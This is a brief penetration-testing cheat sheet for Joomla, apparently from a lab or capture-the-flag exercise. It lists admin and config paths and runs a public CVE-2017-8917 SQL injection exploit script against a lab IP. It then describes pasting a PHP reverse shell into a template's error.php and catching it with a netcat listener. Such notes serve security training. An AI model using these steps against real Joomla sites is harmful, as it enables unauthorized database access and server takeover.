- `Admin page - /administrator`
- `Configuration files configuration.php | diagnostics.php | joomla.inc.php | config.inc.php`



- **To find the Joomla version**
```url
http://10.10.8.222/language/en-GB/en-GB.xml
```


____
### Joomla  version 3.7.0 (CVE-2017-8917 SQL injection)

1. Clone the Exploit Repository
https://github.com/stefanlucas/Exploit-Joomla

2. Run the Exploit Script
```
python3 joomblah.py  http://10.10.8.222/
```

___
### Reverse Shell

- Log in to the **Joomla admin dashboard**.
- Go to **Extensions > Templates** and select the active template i.e (**Protostar Details and Files**).
- Edit the `error.php` file and paste the **Pentestmonkey PHP reverse shell** code.
- Set up a listener on your attacker machine `rlwrap -f . -r nc -nvlp 4444`
- Now, to execute our payload, open a web browser and navigate to `http://<IP>/templates/protostar/error.php.`